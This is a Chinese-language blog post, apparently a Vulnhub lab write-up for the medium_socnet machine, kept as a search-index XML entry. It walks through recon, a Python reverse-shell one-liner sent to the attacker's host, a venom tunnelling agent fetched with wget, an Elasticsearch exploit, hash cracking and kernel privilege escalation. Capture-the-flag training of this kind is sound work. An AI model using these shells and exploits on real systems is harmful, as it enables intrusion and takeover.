<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Vulnhub靶机之medium_socnet</title>
      <link href="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/"/>
      <url>/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">扫描网段获取目标主机arp-scan -l</span><br></pre></td></tr></table></figure><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313152358188.png" alt="image-20220313152358188"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">扫描目标主机端口及服务nmap -sS -sV -sC -p- 192.168.31.52</span><br></pre></td></tr></table></figure><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313152453389.png" alt="image-20220313152453389" style="zoom:80%;"><p>目标系统为Ubuntu，开放22端口，5000端口为web服务，访问目标web</p><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313152552693.png" alt="image-20220313152552693"></p><p>一个留言版，测试了一下，不管输入什么都会显示出来，没有利用的地方</p><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313152611878.png" alt="image-20220313152611878"></p><p>扫一下目录        dirsearch -u <a href="http://192.168.31.52:5000/">http://192.168.31.52:5000/</a></p><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313152638021.png" alt="image-20220313152638021"></p><p>访问admin目录</p><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313152652704.png" alt="image-20220313152652704"></p><p>一个代码测试框，结合前面信息搜集的结果可知使用的是python2.7，接下来就是用python2反弹shell</p><p>nc监听        nc -lvnp 123456</p><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313152708361.png" alt="image-20220313152708361"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python代码反弹shell</span><br><span class="line"><span class="keyword">import</span> socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="string">&quot;192.168.31.125&quot;</span>,<span class="number">12345</span>));os.dup2(s.fileno(),<span class="number">0</span>); os.dup2(s.fileno(),<span class="number">1</span>); os.dup2(s.fileno(),<span class="number">2</span>);p=subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>]);</span><br></pre></td></tr></table></figure><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313152818655.png" alt="image-20220313152818655"></p><p>直接root权限</p><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313152835357.png" alt="image-20220313152835357"></p><p>这就起飞了吗？？？当然不是</p><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313152900646.png" alt="image-20220313152900646"></p><p>ls看到Dockerfile，难道是在docker容器里，进一步排查</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/1/cgroup</span><br></pre></td></tr></table></figure><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313152932507.png" alt="image-20220313152932507"></p><p>的确是在docker容器内，获取的也是docker容器shell，并不是宿主机的shell</p><p>信息搜集一波</p><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153000423.png" alt="image-20220313153000423"></p><p>对外ip为：192.168.31.52        内网ip为：172.17.0.3        内网是否存在其它存活主机？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">内网主机探测    for i in $(seq 1, 254); do ping -c 1 172.17.0.$i;done</span><br></pre></td></tr></table></figure><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153030619.png" alt="image-20220313153030619" style="zoom:80%;"><p>内网存活主机：172.17.0.1    172.17.0.2（已getshell）    172.17.0.3</p><p>扫描服务及端口，但外网没法访问到内网，搭建代理隧道，将getshell的172.17.0.2作为代理服务器，通过172.17.0.2去访问另外两台存活主机</p><p>使用venom搭建代理隧道</p><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153055250.png" alt="image-20220313153055250"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python开启web服务python2 -m SimpleHTTPServer 8888</span><br><span class="line">                        python3 -m http.server 8888</span><br><span class="line">目标主机获取文件 wget http://192.168.31.125:8888/a64</span><br></pre></td></tr></table></figure><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153145468.png" alt="image-20220313153145468"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">本机监听端口./admin_linux_x64 -lport 5566</span><br></pre></td></tr></table></figure><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153206482.png" alt="image-20220313153206482"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">赋予文件执行权限chmod u+x a64</span><br></pre></td></tr></table></figure><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153230820.png" alt="image-20220313153230820"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">连接远程主机./a64 -rhost 192.168.31.125 -rport 5566 </span><br></pre></td></tr></table></figure><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153309221.png" alt="image-20220313153309221"></p><p>创建socks隧道</p><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153326946.png" alt="image-20220313153326946"></p><p>配置proxychains</p><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153340523.png" alt="image-20220313153340523"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">端口服务探测proxychains nmap -Pn -sT -sV  172.17.0.1</span><br></pre></td></tr></table></figure><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153359594.png" alt="image-20220313153359594"></p><p>也是开放22和5000端口，5000为web服务，浏览器代理访问一下</p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153425435.png" alt="image-20220313153425435" style="zoom:80%;"><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153433756.png" alt="image-20220313153433756" style="zoom:80%;"><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153445433.png" alt="image-20220313153445433" style="zoom:80%;"><p>和目标机一摸一样。再看看172.17.0.3</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">端口服务探测          proxychains nmap -Pn -sT -sV  172.17.0.1</span><br></pre></td></tr></table></figure><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153543463.png" alt="image-20220313153543463"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">搜索Elasticsearch漏洞searchsploit Elasticsearch</span><br></pre></td></tr></table></figure><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153609581.png" alt="image-20220313153609581"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">路径/usr/share/exploitdb/exploits/linux/remote/36337.py</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">执行exp       proxychains python 36337.py 172.17.0.3</span><br></pre></td></tr></table></figure><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153639118.png" alt="image-20220313153639118" style="zoom:80%;"><p>获取到172.17.0.3 root权限，并且发现passwords文件夹</p><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153655041.png" alt="image-20220313153655041"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">破解hash     https://www.somd5.com/</span><br></pre></td></tr></table></figure><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153715317.png" alt="image-20220313153715317"></p><p>ssh远程连接宿主机            ssh <a href="mailto:&#106;&#111;&#104;&#110;&#64;&#49;&#57;&#50;&#46;&#49;&#54;&#x38;&#46;&#51;&#x31;&#x2e;&#53;&#50;">&#106;&#111;&#104;&#110;&#64;&#49;&#57;&#50;&#46;&#49;&#54;&#x38;&#46;&#51;&#x31;&#x2e;&#53;&#50;</a></p><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153727980.png" alt="image-20220313153727980"></p><p>多次测试，仅john密码正确，能登录成功</p><p>Linux提权</p><p>suid提权，没可利用的命令</p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153742684.png" alt="image-20220313153742684" style="zoom:80%;"><p>sudo提权也失败</p><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153904073.png" alt="image-20220313153904073"></p><p>内核比较老，可尝试溢出</p><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153827219.png" alt="image-20220313153827219"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">搜索提权expsearchsploit linux 3.13</span><br></pre></td></tr></table></figure><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153919942.png" alt="image-20220313153919942" style="zoom:80%;"><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153942789.png" alt="image-20220313153942789" style="zoom:80%;"><p>目标机没有安装gc，只能在本机上编译好再上传到目标机，但是查看exp发现代码还是需要调用gcc编译ofs-lib.c</p><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313153954033.png" alt="image-20220313153954033"></p><p>删除exp中的调用ofs-lib.c这部分代码，执行编译，将编译后的文件同kali上编译好的ofs-lib.so一起上传目标执行</p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313154007458.png" alt="image-20220313154007458" style="zoom:80%;"><p>编译报错，不影响</p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313154021481.png" alt="image-20220313154021481" style="zoom:80%;"><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313154047914.png" alt="image-20220313154047914"></p><p>同样使用python开启web服务</p><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313154104043.png" alt="image-20220313154104043"></p><p>将两个文件都移动到&#x2F;tmp目录下并赋予exp执行权限</p><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313154115833.png" alt="image-20220313154115833"></p><p>执行就可以获取root权限</p><p><img src="/2022/03/13/title%20Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Bmedium_socnet02/image-20220313154134245.png" alt="image-20220313154134245"></p><p>总结</p><p>web扫目录发现&#x2F;admin  —-&gt;  python2代码测试反弹shell  —-&gt;  获取shell发现是docker容器  —-&gt;  内网探测发现其它主机  —-&gt;  venom scks代理  —-&gt;  Elasticsearch漏洞直接getshell  —-&gt;  发现passwords文件  —-&gt;  hash破解ssh远程登录  —-&gt;  溢出提权</p><hr><p>菜鸡打靶，大佬勿喷。如有错误，欢迎斧正。</p>]]></content>
      
      
      <categories>
          
          <category> Vulnhub靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 打靶 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
